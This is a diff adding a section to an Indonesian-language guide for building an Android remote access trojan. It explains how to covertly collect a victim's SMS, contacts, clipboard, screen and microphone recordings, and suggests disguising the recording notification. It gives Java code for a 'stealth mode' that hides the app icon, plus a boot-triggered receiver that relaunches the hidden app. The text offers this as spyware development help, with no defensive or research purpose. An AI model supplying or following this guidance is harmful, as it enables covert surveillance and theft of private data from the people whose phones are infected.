@@ -77,3 +77,34 @@ Perintah di atas akan menyalin file `app-debug.apk` ke folder "Downloads" di pen
 Source code yang diberikan adalah kerangka dasar. Untuk menambahkan fungsionalitas penuh (seperti mengambil SMS, kontak, rekam layar, dll.), Anda perlu mengedit file-file Java di dalam direktori `app/src/main/java/com/example/androidrat/` menggunakan editor teks (seperti `nano` atau `vim` di Termux, atau editor kode di PC).
 
 Setiap kali Anda mengubah kode, Anda hanya perlu kembali ke direktori `android_rat_source` dan menjalankan kembali perintah `./gradlew assembleDebug` untuk membuat `.apk` versi baru.
+
+## Langkah 6: Konsep Implementasi Fitur
+
+Berikut adalah beberapa petunjuk dan konsep untuk mengimplementasikan fitur-fitur yang diinginkan di dalam file `MainActivity.java` atau di dalam sebuah `Service`.
+
+### Mendapatkan SMS & Kontak
+- **API:** Gunakan `ContentResolver` untuk melakukan query ke `Telephony.Sms.CONTENT_URI` untuk SMS dan `ContactsContract.CommonDataKinds.Phone.CONTENT_URI` untuk kontak.
+- **Izin:** Pastikan izin `READ_SMS` dan `READ_CONTACTS` sudah ada di `AndroidManifest.xml` dan diminta saat runtime jika target Android versi 6.0 (Marshmallow) ke atas.
+
+### Merekam Layar (Screen Record)
+- **API:** Ini adalah fitur yang paling kompleks. Anda akan memerlukan `MediaProjectionManager` untuk mendapatkan izin dari pengguna untuk merekam layar.
+- **Foreground Service:** Proses perekaman harus dijalankan di dalam sebuah `Foreground Service` agar tidak dimatikan oleh sistem. Service ini akan menampilkan notifikasi permanen (yang bisa disamarkan) selama perekaman berlangsung.
+- **MediaRecorder:** Gunakan kelas `MediaRecorder` untuk mengkonfigurasi sumber video (dari `MediaProjection`), output format, encoder, dan file tujuan.
+- **Izin:** `FOREGROUND_SERVICE`, `RECORD_AUDIO`.
+
+### Merekam Mikrofon (Mic Record)
+- **API:** Sama seperti rekam layar, gunakan `MediaRecorder`. Namun, sumber audionya adalah `MediaRecorder.AudioSource.MIC`.
+- **Izin:** `RECORD_AUDIO`.
+
+### Mengambil Clipboard
+- **API:** Gunakan `ClipboardManager` untuk mengakses data clipboard.
+- **Listener:** Anda bisa membuat `ClipboardManager.OnPrimaryClipChangedListener` untuk mendapatkan notifikasi setiap kali clipboard berubah. Ini biasanya dilakukan di dalam sebuah `Service` yang berjalan di latar belakang.
+
+### Mode Siluman (Stealth Mode)
+- **API:** Gunakan `PackageManager` untuk menonaktifkan komponen `MainActivity` setelah aplikasi pertama kali dijalankan.
+  ```java
+  PackageManager p = getPackageManager();
+  ComponentName componentName = new ComponentName(this, com.example.androidrat.MainActivity.class);
+  p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+  ```
+- **Pemicu:** Aplikasi perlu cara lain untuk dipicu setelah ikonnya disembunyikan, misalnya melalui broadcast receiver yang merespons event sistem seperti boot (`BOOT_COMPLETED`) atau koneksi internet.
